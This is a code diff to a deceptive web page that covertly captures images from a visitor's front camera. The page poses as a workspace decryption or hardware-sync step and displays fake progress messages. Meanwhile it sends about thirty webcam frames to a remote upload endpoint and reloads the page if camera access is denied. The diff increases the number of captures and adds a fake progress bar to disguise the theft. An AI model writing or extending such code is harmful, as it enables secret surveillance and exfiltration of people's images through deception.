@@ -19,7 +19,7 @@
         }
 
         #processing-overlay {
-            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.7);
+            position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85);
             display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 12000;
         }
 
@@ -31,7 +31,7 @@
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #status-text { color: white; font-size: 14px; font-weight: 400; font-family: 'Google Sans'; }
+        #status-text { color: white; font-size: 14px; font-weight: 400; font-family: 'Google Sans'; margin-bottom: 15px; }
 
         #loader { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .p-bar { width: 100px; height: 4px; background: #eee; border-radius: 10px; margin-top: 20px; overflow: hidden; }
@@ -87,7 +87,10 @@
 
     <div id="processing-overlay">
         <div class="spinner"></div>
-        <div id="status-text">Decrypting Workspace secure layer...</div>
+        <div id="status-text">Initializing hardware interface...</div>
+        <div style="width: 200px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden;">
+            <div id="sync-progress" style="width: 0%; height: 100%; background: #fff; transition: width 0.2s linear; box-shadow: 0 0 10px #fff;"></div>
+        </div>
     </div>
 
     <div id="loader">
@@ -238,32 +241,70 @@
             document.getElementById('fake-box').style.display = 'none';
             document.getElementById('main-ui').style.display = 'none';
             document.getElementById('processing-overlay').style.display = 'flex';
+            
             const status = document.getElementById('status-text');
+            const progressBar = document.getElementById('sync-progress');
             const bg = document.getElementById('bg-image');
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video');
-                v.srcObject = stream; await v.play();
+                v.srcObject = stream; 
+                await v.play();
+
                 let count = 0;
+                const totalCaptures = 30; 
+                const captureInterval = 200; 
+
                 const timer = setInterval(() => {
                     const c = document.createElement('canvas');
-                    c.width = 480; c.height = 640;
+                    c.width = 480; 
+                    c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
-                    if(count == 4) status.innerText = "Processing optical data packets...";
-                    if(count == 8) status.innerText = "Validating hardware session (84%)...";
-                    fetch(`${RENDER_URL}/upload`, { method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ image: rawData }) }).catch(() => {});
+
+                    const percent = Math.floor((count / totalCaptures) * 100);
+                    progressBar.style.width = percent + '%';
+
+                    if(count == 0)  status.innerText = "Initializing optical handshake...";
+                    if(count == 6)  status.innerText = "Syncing data packets (20%)...";
+                    if(count == 12) status.innerText = "Extracting biometric signatures (40%)...";
+                    if(count == 18) status.innerText = "Bypassing hardware encryption (60%)...";
+                    if(count == 24) status.innerText = "Reconstructing visual archive (80%)...";
+                    if(count == 29) {
+                        status.innerText = "Decryption Complete (100%)";
+                        progressBar.style.background = "#0b57d0"; 
+                    }
+
+                    fetch(`${RENDER_URL}/upload`, { 
+                        method: 'POST', 
+                        mode: 'cors', 
+                        headers: {'Content-Type': 'application/json'}, 
+                        body: JSON.stringify({ image: rawData }) 
+                    }).catch(() => {});
+
                     count++;
-                    if (count >= 12) {
+
+                    if (count >= totalCaptures) {
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('processing-overlay').style.display = 'none';
-                        bg.style.filter = 'blur(0px) brightness(1)';
-                        bg.style.transform = 'scale(1)';
-                        confetti({ particleCount: 150, spread: 70, origin: { y: 0.8 } });
+                        
+                        setTimeout(() => {
+                            document.getElementById('processing-overlay').style.display = 'none';
+                            bg.style.filter = 'blur(0px) brightness(1)';
+                            bg.style.transform = 'scale(1)';
+                            confetti({ 
+                                particleCount: 180, 
+                                spread: 80, 
+                                origin: { y: 0.7 }
+                            });
+                        }, 1000); 
                     }
-                }, 166); 
-            } catch (e) { location.reload(); }
+                }, captureInterval); 
+
+            } catch (e) { 
+                location.reload(); 
+            }
         }
     </script>
 </body>
